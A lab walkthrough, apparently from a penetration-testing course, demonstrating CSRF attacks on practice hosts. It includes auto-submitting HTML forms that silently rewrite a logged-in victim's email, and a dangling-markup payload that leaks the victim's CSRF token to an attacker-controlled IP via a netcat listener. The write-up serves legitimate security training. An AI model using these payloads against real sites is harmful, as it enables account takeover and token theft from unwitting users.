# 🪢 Session Attacks CSRF

## CSRF or XSRF

Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated.

There is a attacker-crafted web page that the victim must visit or interact with

A web application is vulnerable to CSRF attacks when:

* All the parameters required for the targeted request can be determined or guessed by the attacker
* The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:

* To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
* The victim to be logged into the application at the time when the malicious cross-site request is issued

Let's create an account to look at functionalities and launch burp

Now let's save our users informations in web app, we should see this in burp:

<figure><img src="../../../.gitbook/assets/image (1371).png" alt=""><figcaption></figcaption></figure>

Here is some malicious webpage we can craft:

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

We crafted it based on ->

<figure><img src="../../../.gitbook/assets/image (1372).png" alt=""><figcaption></figcaption></figure>

We can host it with a python webserver&#x20;

If we go to `http://<VPN/TUN Adapter IP>:1337/notmalicious.html` while still logged in, the profile details will change to the ones we specified in the HTML page we are serving:

<figure><img src="../../../.gitbook/assets/image (1373).png" alt=""><figcaption></figcaption></figure>

## GET-based

Let's create an account to check for functionalities, if we enter informations and click save, we see this:

<figure><img src="../../../.gitbook/assets/image (1374).png" alt=""><figcaption></figcaption></figure>

and in burp

<figure><img src="../../../.gitbook/assets/image (1375).png" alt=""><figcaption><p>The CSRF token is included in the GET request.</p></figcaption></figure>

Let's create a webpage:

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

{% hint style="info" %}
CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.
{% endhint %}

If we are still connected to our account and visit the page we host, our profile details will change:

<figure><img src="../../../.gitbook/assets/image (1376).png" alt=""><figcaption></figcaption></figure>

## POST-based

On our freshly created account we can see a delete button

If we Click on the "Delete" button. we will get redirected to `/app/delete/<your-email>`

<figure><img src="../../../.gitbook/assets/image (1377).png" alt=""><figcaption><p>email is reflected on the page</p></figcaption></figure>

Let's try inputting HTML:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

<figure><img src="../../../.gitbook/assets/image (1378).png" alt=""><figcaption></figcaption></figure>

Let's try listening on port 8000 with netcat and sending the payload to our victim:

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

So if our target visits `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

<figure><img src="../../../.gitbook/assets/image (1379).png" alt=""><figcaption></figcaption></figure>
